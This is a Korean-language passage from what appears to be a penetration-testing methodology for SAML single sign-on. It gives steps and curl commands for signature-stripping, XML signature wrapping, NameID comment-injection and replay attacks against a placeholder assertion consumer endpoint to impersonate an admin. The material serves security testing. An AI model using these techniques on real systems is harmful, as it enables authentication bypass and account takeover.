### Phase 2: 동적 테스트 (검증)


**테스트 사전 준비:**
1. 정상 SSO 로그인을 수행하여 SAML Response를 캡처 (브라우저 개발자 도구 또는 Burp Suite)
2. SAMLResponse 파라미터를 Base64 디코딩하여 XML 확인
3. SAML Response 구조 분석 (서명 위치, Assertion ID, 속성값 확인)

**서명 제거 공격 테스트:**
```
# 1. SAML Response에서 <ds:Signature> 블록 제거
# 2. Assertion 속성값 변조 (name → admin, email → admin@target.com)
# 3. Base64 인코딩 후 ACS에 전송

curl -X POST "https://target.com/acs" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=[변조된_Base64]&RelayState=/dashboard"
```

**XML 서명 래핑 공격 테스트:**
```
# 1. 변조된 Assertion (ID="_evilID", 속성: admin)을 생성
# 2. 원본 서명된 Assertion 앞에 삽입
# 3. Base64 인코딩 후 ACS에 전송

curl -X POST "https://target.com/acs" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=[래핑된_Base64]&RelayState=/dashboard"
```

**Comment Injection 테스트:**
```xml
<!-- NameID에 주석 삽입 -->
<saml:NameID>admin<!-- injected -->@evil.com</saml:NameID>
```

**Replay 테스트:**
```
# 이전에 사용된 SAML Response를 동일하게 재전송
curl -X POST "https://target.com/acs" \
  -d "SAMLResponse=[이전_Response]&RelayState=/dashboard"
```

**검증 기준:**
- **확인됨**: 동적 테스트로 변조된 SAML Response가 수락되어 다른 사용자로 인증된 것을 직접 확인함
